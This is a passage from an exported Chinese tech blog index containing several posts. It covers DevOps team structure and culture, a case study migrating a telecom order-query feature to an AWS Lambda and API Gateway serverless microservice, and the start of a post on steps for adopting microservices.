上面，并没有什么变化。而且给这个团队一个很高大上的名字：Enablers。然而，这个团队仅仅用新工具是清偿了之前运维工程师留下的技术债，并没有帮助开发团队、测试团队甚至是业务团队从自己的角度提供帮助来提升价值的流动速度和工作效率。\n不光如此，因为这个团队掌握了关键的基础设施资源，成为了所有团队前进的阻力，导致其它部门有更多积压的工作并需要更多人的人来处理。由于出现了这样的结果，“DevOps doesn\u0026rsquo;t work in my orgnization”（DevOps 在我的组织里不好使）的批评也不绝于耳。\n在 DevOps 转型的初期，我们需要一个这样的团队从运维的角度提出统一的方案并提供统一的服务支持。但随着 DevOps 能力和成熟度的提升，这样一个实体团队而不是虚拟团队的存在则会成为 DevOps 继续发展的阻力。\n一个有 Ops 的 Dev 团队 #最天真的想法莫不如把两类工程师放在一个团队里，在同一个负责人的范围内消化 Dev 和 Ops 的问题。这样，Dev 和 Ops 就能统一目标，平衡矛盾和冲突，共同解决问题。\n但实际上很少有企业能够走出这一步，一方面是 IT 部门的岗位设置和预算归属，另一方面是团队变更后的 KPI 考核。一件很小的举动就会牵扯更多的问题，使 DevOps 难以进行下去。此外，如果缺乏有效的 DevOps 实践或者外部教练d 额指引，那么使 Dev 和 Ops 的融合将是一个漫长的旅程。\n在这种情况下，我建议采用 DevOps 项目制的方式来进行 DevOps 的体验：\n首先根据项目汇聚资源，在项目中预留 Ops 角色。 从运维部门借调运维工程师到项目中。运维部门要提前安排好运维工作的交接，或者至少把日常性的运维任务的80%剥离出来，分配给现有团队。保证进入项目团队的运维工程师的工作不被打扰 Ops 所在的部门绩效分为两块：一块为常规运维绩效（保证系统稳定性），另一块为 DevOps 项目绩效（保证开发顺利性），可以根据具体工作状况来设置这样的工作比率。 保证运维团队人员能够有机会进入项目实践 DevOps ，同时要把项目开发中的运维痛点带回给运维团队处理。 在上述 2的悉尼项目里，我就成为了加入到了产品开发团队中的运维工程师。一方面解决开发团队痛点，一方面和 Enablers 团队沟通。一方面解决 开发团队的痛点，另一方面获得相应的权限和知识，并把 开发团队的反馈及时传达给 Enablers 团队。\n一个 Dev 和 Ops 合作的团队 #这就是 DevOps 所要达到的目标，它不是一个人的属性，而是一个团队的属性。它让利益相关方坐在一起解决问题，而不是相互甩锅。然而，由于”合作“的定义很简单，也很空泛，导致”合作“难以落地。以下是我认为”关键”的 DevOps 合作方式：\n共同进行架构设计 共同进行技术决策 持续交付流水线的建立 共同 Pair 和 Review 代码和环境的配置 共同参与回顾会议 通过定期的内部 Session 增加相互的理解 共同处理运维的问题 此外，还有很多其他的合作方式能够提升 DevOps 的效果，在此不一一列举，这里仅做参考。如果你是一个敏捷的团队，只需要把 Ops 作为团队的一份子，参加所有的活动就可以了。\nDevOps 是一种组织文化 #在著名在 Velocity 09 大会上，来自 Flicker 的著名演讲”10+ Deploys Per Day: Dev and Ops Cooperation“ 明确的指出工具和文化是他们成功的原因。这也第一届 DevOpsDays 也将工具和文化这两个话题进一步细化。在会后 Patrick Debois 把 DevOps 定义为“管理改进”和技术提升“。\nJohn Willis 和 Damon Edwards 也在 2010 年 MoutainView 举办的 DevOpsDays 中重新强调了文化的重要性。\n相对于可以看得见的工具，文化显得华而不实，也有人认为 DevOps 文化是一种“空谈陷阱”。\n有一篇关于企业文化的文章写的非常好，这篇文章叫做”Culture is the Behavior You Reward and Punish“。翻译过来就是：文化就是你奖励和惩罚的行为。就是说对行为的惩罚和奖励构成了你的文化，对 DevOps 也一样。奖励符合 DevOps 的行为（而不仅仅是鼓励），惩罚不符合 DevOps 的行为。就形成了 DevOps 的文化。\n而我所说的“建立 DevOps 的文化“则是建立一种规则约束，这种约束不但包含了 DevOps 的行为准则，而且包含了奖励和惩罚的机制。而这种规则约束不能变成一纸空文，更要切实执行下去，形成一种行为习惯。\n习惯的力量则能够保证一种好的制度和实践顺利的延续下去。当然这种规则约束不是一成不变的，这些约束和规则也需要根据团队的发展不断的变化以适应新的状况。\n然而，就如上文所说的，由于企业并不存在产生 DevOps 的基因（否则你早就有 DevOps 了）。这些制度很难从内部产生，必须要的话，请引入外部资源，例如 DevOps 顾问或者 DevOps 教练。\n我经常看到一些 ”KTV式转型”，这种转型就像是唱 KTV：当人们在 KTV 里面对歌词字幕你总能唱出来，也能唱对。但如果没有歌词，人们往往就唱不出来了。这里的歌词字幕就相当于是转型教练，当教练在的时候，每个人都知道怎么做。当教练不在，什么都没有了。\n很多情况下，顾问和教练在短期内起到从”0到1“的转变，然而从”1-100“则不是一朝一夕就能实现的。文化的形成是一个长期的塑造过程，不是能够买来的。你需要有足够的耐心来不断的评估和反馈当前的状况。\n以下是 DevOps 所鼓励的行为。尽管每个人都鼓励以下的行为，但实际效果则千差万别，往往抓住了形式而不是本质。\n信任 沟通 学习 分享/共担 不要指责 信任 #你的团队里的 Dev 和 Ops 之间是相互信任的吗？你信任你的团队成员吗？如果回答是。那么你的团队成员信任你吗？信任是相互的，而且是高效团队成功的基石。获得信任很难，需要时间去建立。信任同样也很脆弱，很容易就会失去。你是否明确哪些行为对信任有帮助，而哪些行为会伤害信任？你能说出那些帮助构建信任和伤害信任的行为吗？你的团队都清楚吗？\n当想到以上这些问题，你还信任你自己和你的团队吗？\n这里有一个很重要的原理：没有无条件的信任，信任是需要建立的。\n除了《凤凰项目》中所介绍的构建信任的方式——把自己最脆弱的一面告诉大家——以外，这里我推荐一种构建信任的方式：\n回顾团队中的每一个人。 把你不信任的人说出来，并且说出你不信任的点。 为了消除这种不信任，你自己愿意做什么事情（而不是让对方做什么事情） 其它人为了消除团队中的不信任，也可以轮流发言。 如果消除了这种不信任，也请说出来。并为之前你不信任的人和整个团队故障欢呼。 第三点最为重要，我们给出的建议往往不起效的原因就在于你在对别人提要求，而不是提供帮助。而人们对于提要求的感受都不会很好，只有提供自己的帮助，才是真正能解决问题的有效方式。另外，作为同一个团队的成员，你也必须想办法相信对方，并且让对方相信自己，没有选择。\n很多人都觉得难以启齿，难以启齿的原因就是因为人们不愿意相信对方能够接纳这些不信任。而这么做恰恰能表明你对对方的信任，相信经历过一系列的措施之后，能改善当前的状况。\n如果你觉得信任很难达成，那么这就是一个风险点，他会影响团队成员的行为和判断，造成不利的影响。所以，请多检查团队内部的信任情况，及时排除风险。\n沟通 #沟通是一个泛滥的话题，各种打着“高效沟通”的方法也层出不穷，但人们虽然都懂各种道理，也知道沟通的重要性，可沟通仍然被用作为”命令“的幌子，或用来实施语言暴力。\n沟通的主要目的在于对齐交换意见和看法，达成理解。\n沟通不仅仅是信息交流的通道，同样也是情绪宣泄的出口。我们在沟通中，有多少是发泄情绪占了很大的比重，但我们往往没有察觉。人们对表达自己的情绪是难以启齿的，因此用各种各样的“道理”来掩盖真实的意图。如果团队成员的大脑被不良情绪占据，那么无论如何他在团队中都不会有很好的表现的。人们往往会用其它的方式宣泄自己的情绪，而缺乏正确的发泄渠道则会导致灾难。\n你的团队里有没有比较沉默的人或者是不喜欢主动沟通的人？由于信任的逐渐缺失，有些人往往不再沟通。而这类不再沟通的人，往往是项目中的定时炸弹。而情绪积累到某一个点后，这个炸弹就会爆炸，造成很恶劣的影响。所以，尽早的介入并让每个人能够很顺畅的沟通，对降低情绪风险，尤为重要。\n此外，在沟通里，你是听的多？还是说的多？如果作为听者，你真正明白对方讲的是什么吗？如果作为说者，你在沟通之前，你是否有计划，是否明确沟通的目的，沟通后如何确认达到了沟通的目的？\n如果不确认这些问题，那么沟通往往就是没有意义的闲聊。\n学习 #在英文里， 学习是一个词——Learn 。而在中文里“学习”是两个词，对应的英文分别是 Learn （学）和 Practice（习）。比如：learnt 就可以因为上下文的不同表示两种意思。一种是”经历过学习的过程，但不一定掌握”，另一种则是真正学会了。\n当说到学习，往往想到的都是“输入”：看书（虽然买了也未必会看），看博客，看代码，看视频…… 然后练习，直到掌握。\n然而，仅有输入是不够的，学习还应当有”输出“：形成博客、开源软件、演讲甚至是培训工作坊。有一句很著名的话叫做：“教是检验学习成果的唯一标准。”是不是真的掌握了，教一下别人，你会意识到“学习的错觉”。\n在这里，我要强调一种重要的输入途径：从过往的经验教训中反思，总结，并形成团队的经验。很多事情过去了，无论成败，往往缺乏总结。这无法让团队成长，因为成败全凭”运气“。\n学习的目的在于指导今后的实践，无论成败，都会降低未来失败的概率，多做“正确的事”，少做“错误的事”。\n而只有学，没有习。只有输入，没有输出，或者只向外看，不向内看，都是片面的学习方式。我推荐的学习方式则是以输出作为学习目标，对知识和信息进行加工，思考，实践，提炼的过程。\n毕竟，判断一个人的知识不再于他的输入，而在于他的输出。因为讲出来，才是自己的。\n不要指责 #很多问题棘手是因为人们不关注如何解决问题，而关注这个问题究竟是谁该负责。如果团队在责任归属的问题上花的时间很多，那么这就是一个指责文化的制度。在这种情况下，团队成员为了自保，会避免承担责任和解决问题。因此，很多事情没有进展，于是，整个组织沉浸在一种”不求有功，但求无过“的氛围下慢慢凝结，最后僵化。\n我们常常听到“零容忍”，然而对问题的”零容忍“往往是很漂亮的口号。但它往往指的是”发现问题掩盖问题“。以前人们都说，不怕有问题，就怕看不见问题。而现在很多问题的出现并不是“黑天鹅\u0026quot;\u0026ldquo;事件，而是\u0026quot;灰犀牛\u0026quot;事件。恰恰是对问题的选择性失明导致了不可挽回的结果。\n在实践 DevOps 的时候，需要先测试一下有多少装睡的人。因为没有解决不了的问题，只有不愿承担的责任。\n分享/共担 #Share 在英文里有两个意思，一个和别人分享，另一个是和别人共同承担。在 DevOps 的上下文里二者兼有，一方面是作为学习的结果的产出。另一方面是避免组织陷入不愿承担责任的文化。对于团队作战来说，一个人犯错，不是他一个人的责任，而是集体的责任。”当你用一个指头指着别人的同时，另外四个指头也指着自己。\n我们要相信没有不良的人，只有不良的制度。当出现了问题，从制度上而不是从个人的角度分析问题出现的原因。而且要能总结原因，形成新的制度。如果一个问题不在制度上去避免，那么还会发成下一次。\n如果什么都是 DevOps ，那么 DevOps 实际上什么也不是 #如果把所有 DevOps 相关的内容加总就能得到 DevOps，那和没有定义 DevOps 一样。如果我们没办法确定”什么不是 DevOps“，那同理我们也很难定义 DevOps 是什么。\n我试图从上文中的认识里，提取出一些 DevOps 的必要元素来构成 DevOps 的概念。这些元素缺一不可，但单独拿出来又不能构成完整 DevOps 的概念。这样既可以保证对 DevOps 的完整理解，又避免 DevOps 概念过大难以下手。\n根据我自己的实践，我认为 DevOps 包括以下几点原则：\nDevOps 有一个明确的目标：通过充分的合作解决由于责任模糊而相互推诿的问题。（没有 DevOps 痛点的团队自然也没有 DevOps 的动力） DevOps 是一个团队属性而不是个人属性，这个团队需要处理开发和维护任务。（有单一任务都不算是 DevOps 团队，因为没有合作解决 DevOps 痛点的动机） DevOps 是一种团队改进，对于团队的表现有明确目标和度量。（没有度量的改进就是耍流氓） DevOps 是一种团队工作方式和文化，它包括了一系列促进 Dev 和 Ops 合作的具体技术和实践以达到上述目标。（ DevOps 也不是缺乏技术的理论空谈 ） 因此，以下的描述都不是 DevOps：\nDevOps 不是一个职务或者角色，因为 DevOps 是团队属性。 不存在” DevOps 团队“，只存在”以 DevOps 方式工作的团队“。 以上是我过去三年的 DevOps 实践和咨询经历，希望能给正在做 DevOps 的你一些参考和提示，并祝愿你在 DevOps 的实践过程中更加顺利。\n","date":"December 3, 2017","permalink":"/blog/2017/2017-12-03-we-are-talking-different-devops/","section":"Blogs","summary":"","title":"关于 DevOps ，咱们聊的可能不是一回事"},{"content":"Serverless 架构最早可以追溯到 Ken Fromm 发表的文章《Why The Future Of Software And Apps Is Serverless》。在这篇文章里， Ken Fromm 描述了在未来云计算基础设施普及的情况下。在构建应用程序的时候，开发人员和运维人员无需担心服务器如何安装配置，如何设置网络和负载均衡，无需监控状态，甚至不再会出现服务器相关的工作内容。这样可以让原本建设机房的时间成本和货币成本从按年计算缩短至按秒计算。\n在 Martin Fowler 的博客《Serverless Architectures》中，他将无服务器架构分为两种：\n第一种无服务器架构被称为被称为 BaaS（Backend as a Service，后端应用即服务）。即应用的架构是由一大堆第三方 API 来组织的。一切状态和逻辑都由这些服务提供方来管理。随着移动应用和单页 Web 应用这样的富客户端（Rich Client）应用的普及，前后端的通信渐渐以 API 调用为主，而所需的服务不再由 服务端应用开发工程师和运维工程师来维护，只需要调用提供服务的第三方 API 就可以完成相应的功能。例如云上的数据库服务和用户认证服务。\n另一种无服务器架构被称为 FaaS（Function as a Service，函数即服务)。这一架构的兴起源于 AWS Lambda 的发展。 AWS Lambda 是一种无状态的代码运行时服务，这项服务提供最小的代码运行资源。你可以使用 Java，Node.js，Python 和 C# 编写程序处理 AWS 各种服务的事件。无需初始化一台服务器，安装操作系统并配置程序运行环境。由于运行资源很少，完成的计算有限，使得这种应用无法保存状态，因此这类程序以函数的方式存在。\n本文所介绍的 Serverless 架构主要是以 AWS Lambda 以及 Amazon API Gateway 架构的应用，它同时也具备 BaaS 的特征。\nAWS Lambda 的编程模型 #AWS Lambda 的编程模型如下所示：\nAWS Lambda 运行在一个虚拟的容器里，但你无法配置这个容器。此外，这个虚拟的容器有一些[资源限制]，主要限制如下：\n5 分钟（300 秒）的程序运行时间。 512 MB 的文件系统空间。（在 /tmp 目录下） 最大1536 MB 的内存。（最小 128 MB，以 64 MB 作为增量） 最多 1024 个文件描述符。 最大 1024 个内部线程。 Lambda 的执行流程：\n当事件触发 Lambda 执行的时候，Lambda 会将事件所携带的信息通过上下文对象（Context Object）传给处理函数（Handler）。此外，Lambda 还可以读取预先设置的环境变量。 执行处理函数，并将日志通过 CloudWatch 记录下来。 执行完毕后通过事件返回执行结果，或者抛出异常。 执行结果和对应的异常可以绑定其它资源继续处理。 当事件请求大批量发生的时候。Lambda 会为每一个事件单独执行一次 。这意味着每一个请求之间的执行期间，内容是不能共享的。（本人亲测内容是可以共享的，但内容保留的时间和状态无法保证。）\nAmazon API Gateway + AWS Lambda 的微服务架构 #根据 Martin Fowler 对微服务的描述性定义，我们可以认为微服务从技术层面包含以下特征：\n每个服务运行在自己的进程中。 服务间通信采用轻量级通信机制(通常用HTTP资源API)。 这些服务围绕业务能力构建并且可通过全自动部署机制独立部署。 这些服务共用一个最小型的集中式的管理。 服务可用不同的语言开发，使用不同的数据存储技术。 在 AWS 现有的服务情况下，AWS Lambda 满足了上面的第 1、3、5 点，这只是一个处理单元，非管理单元。而 2 和 4 则需要另外的服务作为管理单元共同构成微服务。这个任务就交由 API 网关实现。\nAmazon API Gateway 是一种完全托管的服务，可以帮助开发者轻松创建、发布、维护、监控和保护任意规模的 API。它集成了很多 API 网关的功能，诸如缓存、用户认证等功能。并且支持通过 HAML 和 Swagger 配置，这样就可以用代码管理系统配置 API 了。1·\nAmazon API Gateway 可以根据不同的 Restful API 访问点将请求的数据传递给不同的资源进行处理。一般的 AWS API 架构如下所示：\n当请求通过域名访问到应用的时候，应用会将 HTTP 请求转发给 CDN (CloudFornt)。 CloudFront 会根据转发规则把对应的 API 请求转发到 API Gateway 上。 API Gateway 会根据请求的访问点和内容交给对应的 AWS Lambda 或者 EC2 服务处理，也可以发送给其它可访问的服务。 处理完成后将返回请求结果给客户端。在返回的时候，API Gateway 也可以通过 Lambda 对返回内容进行处理。 相较于传统的微服务架构，通过 API Gateway 和 Lambda 的这种集成方式可以得到更轻量级的微服务。团队只需要规划好 API 访问并完成函数的开发，就可以快速的构建出一个最简单的微服务，使得微服务基础设施的搭建时间从几周缩短为几个小时。此外，大大提升了微服务架构的开发效率和稳定性。\n一次微服务的奇遇 #2016年12月初，当时我正在以一名 DevOps 咨询师的身份参与悉尼某一移动电话运营商的 Digital （电子渠道）部门的 DevOps 转型项目中。这个项目是提升该部门在 AWS （Amazon Web Services）云计算平台上的 DevOps 能力。\nDigital 部门负责该电信运营商所有的互联网和移动设备应用开发。这些应用主要是用来为用户提供诸如 SIM 卡激活，话费查询，话费充值，优惠套餐订购等自助服务（Self service），从而降低营业厅和人工话务客服的成本。\n自助服务的应用系统基于 Ruby on Rails 框架开发，前端部分采用 AngularJS，但是没有采用前后端分离的设计。Mobile 端采用 Cordova 开发，为了降低开发难度和工作量， Mobile 端的应用仅仅是把 AngularJS 所生成的 Web 页面嵌入移动端，但因为经常超时，所以实际体验并不好。\n这套应用部署在 AWS 上，并且通过网关和内部业务 BOSS （Business Operating Support System） 系统隔离。内部业务系统采用 SOAP 对外暴露服务，并由另外一个部门负责。因此，云上的应用所做的业务是给用户展现一个使用友好的界面，并通过数据的转化和内部 BOSS 系统进行交互。系统架构如下图所示：\n应用的交互流程如下 # 浏览器或者移动端通过域名（由 AWS Route 53托管）转向 CDN（采用 AWS Cloudfront）。 CDN 根据请求的内容类别进行区分，静态文件（图片，JS，CSS 样式等），会转向 AWS S3 存储。动态请求会直接发给负载均衡器 （AWS Elastic Load Balancer）。 负载均衡器会根据各 EC2 计算实例的负载状态将请求转发到不同的实例上的 Ruby On Rails 应用上。每一个应用都是一个典型的 MVC Web 应用。 EC2 上的应用会将一部分数据存储在关系型数据服务(AWS RDS，Relational Database ServiceS）上，一部分存储在本地文件里。 经过应用的处理，转换成 SOAP 请求通过 网关发送给 BOSS 系统处理。BOSS 系统处理完成后会返回对应的消息。 根据业务的需要，一部分数据会采用 AWS ElasiCache 的 Redis 服务作为缓存以优化业务响应速度。 团队痛点 #这个应用经历了多年的开发，前后已经更换过很多技术人员。但是没有人对这个应用代码库有完整的的认识。因此，我们对整个团队和产品进行了一次痛点总结：\n组织结构方面 # 运维团队成为瓶颈，60 个人左右的开发团队只有 4 名 Ops 支持。运维团队除了日常的事务以外，还要给开发团队提供各种支持。很多资源的使用权限被限制在这个团队里，就导致各种问题的解决进度进一步拖延。 随着业务的增长，需要基础设施代码库提供各种各样的能力。然而 Ops 团队的任何更改都会导致所有的开发团队停下手头的进度去修复更新所带来的各种问题。 应用架构方面 # 应用架构并没有达到前后端分离的效果，仍然需要同一个工程师编写前后端代码。这样的技术栈对于对于开发人员的要求很高，然而市场上缺乏合适的 RoR 工程师，导致维护成本进一步上升。经过了三个月，仍然很难招聘到合适的工程师。 多个团队在一个代码库上工作，新旧功能之间存在各种依赖点。加上 Ruby 的语言特性，使得代码中存在很多隐含的依赖点和类/方法覆盖，导致了开发进度缓慢。我们一共有 4 个团队在一个代码库上工作，3个团队在开发新的功能。1 个团队需要修复 Bug 和清理技术债，这一切都要同时进行。 技术债方面 # 代码库中有大量的重复 cucumber 自动化测试，但是缺乏正确的并行测试策略，导致自动化测试会随机失败，持续集成服务器 （Jenkins）的 slave 节点本地难以创建，导致失败原因更加难以查找。如果走运的话，从提交代码到新的版本发布至少需要 45 分钟。如果不走运的话，两三天都无法完成一次成功的构建。 基础设施即代码（Infrastructure As Code）建立在一个混合的遗留的 Ruby 代码库上。这个代码库用来封装一些类似于 Packer 和 AWS CLI 这样的命令行工具，包含一些 CloudFormation 的转化能力。由于缺乏长期的规划和编码规范，加之人员变动十分频繁，使得代码库难以维护。 此外，基础设施代码库作为一个 gem 和应用程序代码库耦合在一起，由运维团队负责，因此很多基础设施上的问题开发团队无法解决，也不愿解决。 我参与过很多 Ruby 技术栈遗留系统的维护。在经历了这些 Ruby 项目之后，我发现 Ruby 是一个开发起来很爽但是维护起来很痛苦的技术栈。大部分的维护更改是由于 Ruby 的版本 和 Gem 的版本更新导致的。由于 Ruby 比较灵活，人们都有自己的想法和使用习惯，因此代码库很难维护。\n虽然团队已经有比较好的持续交付流程，但是 Ops 能力缺乏和应用架构带来的局限阻碍了整个产品的前进。因此，当务之急是能够通过 DevOps 提升团队的 Ops 能力，缓解 Ops 资源不足，削弱 DevOps 矛盾。DevOps 转型有两种方法：一种方法是提升 Dev 的 Ops 能力，另一种方法是降低 Ops 工作门槛。在时间资源很紧张的情况下，通过技术的改进，降低 Ops 的门槛是短期内收益最大的方法。\n微服务触点：并购带来的业务功能合并 #在我加入这个项目的时候，客户收购了一个本地的宽带/固定电话运营商。这就会导致原有的系统需要需要承载固话和宽带的新业务。恰巧有个订单查询的业务需要让当前的团队完整这样一个需求：通过现有的订单查询功能可以同时查询移动和固网宽带订单。\n这要求在原由的订单查询功能上新增添一些选项和内容，可以同时查到移动和固网宽带的订单。通过上述痛点可知，这在当时完成这样一个任务的代价是十分巨大的。\n在开发的项目上进行 DevOps 转型就像在行进的汽车上换车轮，一不留心就会让所有团队停止工作。因此我建议通过设立并行的新团队来同时完成新功能的开发和 DevOps 转型的试点。\n这是一个功能拆分和新功能拆分需求，刚好订单查询是原系统中一个比较独立和成熟的功能。为了避免影响原有各功能开发的进度。我们决定采用微服务架构来完成这个功能。\n构建微服务的架构的策略 #我们并不想重蹈之前应用架构的覆辙，我们要做到前后端分离。使得比较小的开发团队可以并行开发，只要协商好了 接口之间的契约（Contract），未来开发完成之后会很好集成。因此，我们必须是一个完全不同的独立应用。\n这让我想起了 Chris Richardson 提出了三种微服务架构策略，分别是：停止挖坑，前后端分离__和__提取微服务。\n挖坑第一法则指出：如果发现自己掉坑里，马上停止。\n原先的单体应用对我们来说就是一个焦油坑，因此我们要停止在上面继续工作。所以，我们拆分策略模式如下所示：\n在我们的架构里，实现新的需求就要变动老的应用。我们的想法是：\n构建出新的业务页面，生成微服务契约。 根据 API 契约构建出新的微服务。 部署 Web 前端到 S3 上，采用 S3 的 Static Web Hosting （静态 Web 服务） 发布。 部署后端微服务上线，并采用临时的域名和 CDN 加载点进行测试。 通过更新 CDN 把原应用的流量导向新的微服务。 删除旧的服务代码。 我们原本要在原有的应用上增加一个 API，以访问以前的逻辑。但想想挖坑第一原则这仍然是给遗留代码挖坑，在评估了业务的复杂性之后。我们发现这个功能如果全新开发只需要 2人2周（一个人月）的时间，这仅仅占我们预估工作量的20%不到。因此我们放弃了对遗留代码动工的念头。最终通过微服务直接访问后台系统，而不需要通过原有的应用。\n在我们拆微服务的部分十分简单。对于后端来说说只需要修改 CDN 覆盖原先的访问源（Origin）以及保存在 route.rb 里的原功能访问点，就可以完成微服务的集成。\n构建出新的业务页面，生成微服务契约 #结合上面的应用痛点和思路，在构建微服务的技术选型时我们确定了以下方向：\n前端框架要具备很好的 Responsive 扩展。 采用 Swagger 来描述 API 需要具备的行为。 通过消费者驱动进行契约测试驱动微服务后端开发。 前端代码库和后端代码库分开。 前端代码框架要对持续交付友好。 因此我们选择了 React 作为前端技术栈并且用 yarn 管理依赖和任务。此外，我们引入了 nodejs 版本的 AWS SDK 编写一些常见的诸如构建、部署、配置等 AWS 相关的操作。并且通过 swagger 描述后端 API 的行为。这样，后端只需要满足这个 API 规范，就很容易做前后端集成。\n部署前端部分到 S3 上 #由于 AWS S3 服务自带 Static Web Hosting （静态页面服务） 功能，这就大大减少了我们构建基础环境所花费的时间。如果你还想着用 Nginx 和 Apache 增加静态资源处理规则，你已经 OUT 了。\n虽然， AWS S3 服务发生过故障，但 SLA 也比我们自己构建的 EC2 实例处理静态内容要好。此外还：\n拥有独立的 URL，很容易做很多 301 和 302 的重定向和改写操作。 和 CDN （CloudFront）集成很好。 很容易和持续集成工具集成。 最大的优点：比 EC2 便宜。 根据 API 契约构建出新的微服务 #当前端应用明确了所需要访问 API 的格式我们就知道如何组织后端的业务了，我们最初的想法并不想采用 Lambda 和 API Gateway，当时有两个选择：\n采用 Sinatra （一个用来构建 API 的 Ruby gem） 构建一个微服务 ，这样可以复用原先应用的很多组件。换句话说，只需要 copy 一些代码，放到一个单独的代码库里，就可以完事。但也会面临之前 Ruby 技术栈带来的种种问题。 采用 Spring Boot 构建一个微服务，一方面是解决了 Ruby 技术栈带来的问题。（Java 作为成熟工程语言目前还是最好的选择），另一方面可以服用后台很多用来做 SOAP 处理的类包。 然而，这两个方案的都有一个共同的问题：需要通过 ruby 语言编写的工具构建一套运行微服务的基础设施。而这个基础设施的搭建，前前后后估计得需要至少 1个月，这还是在运维团队有人帮助的情况下。\n所以，要绕过运维团队能够直接操作环境，只有避开传统的 EC2 搭建应用的方式。\n这，只有 Lambda 可以做到！\n因此，我们选择了 Amazon API Gateway + Lambda 的组合，除了上述原因以外。Amazon API Gateway + Lambda 还有额外好处：\n支持 Swagger 规范。也就是说，你只要导入前端的 Swagger 规范，就可以生成 API Gateway。 可以用数据构建 Mock API，这样就可以很大程度上实现消费者驱动契约开发。 通过 Amazon API Gateway 的 Stage 功能，我们无需构建 QA 环境，UAT 环境和 Staging 环境。只需要指定不同的 Stage，就可以完成对应的切换。 Lambda 的发布生效时间很短，反馈很快。原先用 CloudFormation 构建的 API 基础设施需要至少 15 分钟，而 Lambda 的生效只需要短短几秒钟。 Lambda 的编写很方便，可以采用在线的方式。虽然在线 IDE 并不很好用，但是真的也写不了几行代码。 Lambda 自动根据请求自扩展，无需考虑负载均衡。 虽然有这么多有点，但不能忽略了关键性的问题：你应用不一定适合 AWS Lambda！\n根据上文对 AWS Lambda 的介绍。支持 AWS Lambda 运行的资源和时间很有限。因此很多需要支持同步和强一致性的业务需求是无法满足的。因此，只适合能够异步处理的场景。此外，AWS Lambda 暂时对消耗存储空间和 CPU 很多的场景支持的很好，例如 AI 和 大数据。（AWS 已经有专门的 AI 和大数据服务了，所以不需要和自己过不去）\n根据上文对现有架构的介绍，我们的 Ruby On Rails 应用中的这个功能实际上只是一个数据转换适配器：把前端输入的数据进行加工，转换成对应的 SOAP 调用。因此，对于这样一个简单的场景而言，Amazon API Gateway + Lambda 完全满足需求！\n部署后端微服务 #选择了Amazon API Gateway + Lambda 后，后端的微服务部署看似很简单：\n更新 Lambda 函数。 更新 API 规范，并要求 API 绑定对应 Lambda 函数。 但是，这里面的坑却十分的多。我们将在《Serverless 风格微服务的持续交付（中）：持续交付的挑战》中详细介绍。\n把原应用的请求导向新的微服务 #这时候给新的微服务在 CDN 上配置 API Gateway 作为一个新的请求源（Origin），覆盖原先写在 route.rb 和 nginx.conf 里的 API 访问规则就可以了。CDN 在 nginx.conf 之前就会把对应的请求转发到 API Gateway。\n当然，如果你想做灰度发布的话，可能就不能这么搞了。CloudFront 和 ELB 负载均衡 并不具备带权转发功能。因此你需要通过 nginx 配置，按访问权重把 API Gateway 作为一个 upstream 里的一个 Server 就可以了。\n删除旧的服务代码 #斩草要除根，虽然我们可以保持代码不动。但是清理不再使用的遗留代码和自动化测试可以为其它团队减少很多不必要的工作量。\n不要留着无用的遗留代码！不要留着无用的遗留代码！不要留着无用的遗留代码！重要且最容易被忽略的事情强调三遍。\n最终的架构 #经过6个人两个月的开发（原计划8个人3个月），我们的 Serverless 微服务最终落地了。当然这中间有 60% 的时间是在探索全新的技术栈。最后的架构如下图所示：\n在上图中，请求仍然是先到 CDN （CloudFront），然后：\nCDN 根据请求点的不同，把页面请求转发至 S3 ，把 API 请求转发到 API Gateway。 前端的内容通过蓝绿部署被放到了不同的 S3 Bucket 里面，只需要改变 CDN 设置就可以完成对应内容的部署。虽然对于部署来说蓝绿 Bucket 乍看有一点多余，但这是为了能够在生产环境下做集成在线测试准备的。这样可以使环境不一致尽可能少。 API Gateway 有自己作用的 VPC，很好的实现了网络级别的隔离。 通过 API Gateway 转发的 API 请求分成了三类，每一类都可以根据请求状况自扩展： 身份验证类：第一次访问会请求 ElastCache（Redis），如果 Token 失效或者不存在，则重新走一遍用户验证流程。 数据请求类：数据请求类会通过 Lambda 访问由其他团队开发的 Java 微服务，这类微服务是后台系统唯一的访问点。 操作审计类：请求会记录到 DynamoDB （一种时间序列数据库）中，用来跟踪异步请求的各种日志。 API Gateway 自己有一些缓存，可以加速 API 的访问。 消息返回后，再有三类不同的请求的结果统一通过 API Gateway 返回给客户端。 Serverless 风格微服务架构的优点 #由于没有 EC2 设施初始化的时间，我们减少了至少一个月的工作量，分别是：\n初始化网络配置的时间。 构建 EC2 配置的时间。 构建反向代理和前端静态内容服务器的时间。 构建后端 API 应用基础设施的时间。 构建负载均衡的时间。 把上述内容用 Ruby 进行基础设施即代码化的时间。 如果要把 API Gateway 算作是基础设施初始化的时间来看。第一次初始化 API Gateway 用了一天，以后 API Gateway 结合持续交付流程每次修改仅仅需要几分钟。\n此外，对于团队来说，Amazon API Gateway + Lambda 的微服务还带来其它好处：\n降低了基础设施门槛，减少了大量 Ops 工作量。 开发效率高，原先至少 45 分钟的开发反馈周期缩短为 5 分钟以内。 无关的代码量少，需要维护的代码量少。除了专注业务本身。上游和 API Gateway 的集成以及下游和后端服务的集成代码量很少。 Java，Python 和 Nodejs 的开发效率很高。由于代码量少，也很好维护。避免了把代码越滚越大。我们做了 Java 和 NodeJs 比较。在开发同样的功能下，NodeJS 的开发效率更高，Java 要把请求的 json 转化为对象，也要把返回的 json 转化为对象，而不像 nodejs 直接处理 json。此外， Java 需要引入一些其它 JAR 包作为依赖。 最后 #Serverless 风格的微服务虽然大大减少了开发工作量以及基础设施的开发维护工作量。但也带来了新的问题，让我们重新思考了 Serverless 给以往持续交付模式带来的挑战。\n","date":"September 21, 2017","permalink":"/blog/2017/2017-09-21-serverless-architecture-sample/","section":"Blogs","summary":"","title":"Serverless 风格的微服务的架构案例"},{"content":" 本文是GitChat《为什么微服务实施那么难？如何高效推进微服务架构演进》的下半部分。标题和部分内容已做修改。\n微服务实施常被忽视的 5 个难点中描述了实施微服务常见的主要阻碍。本文针对前文提到的 5 个难点提出了 7 个步骤。每个步骤分别包含了管理和技术两方面的建议。\n如果之前的 5 点都让你膝盖中箭。那么根据我个人的经验，综合解决微服务实施难点的第一步就是：\n步骤1：以终为始，先构建一个独立的敏捷微服务团队 #我们对微服务的期待就是：可以独立开发，独立部署，独立发布，并且去中心化管理。那么，我们就先构造一只“可以独立开发，独立部署，并且去中心化管理”的团队。\n这个团队为了达到这个目标，会采取各种方法（例如：DevOps，全功能团队）解决阻碍”独立开发，独立部署，独立发布 和 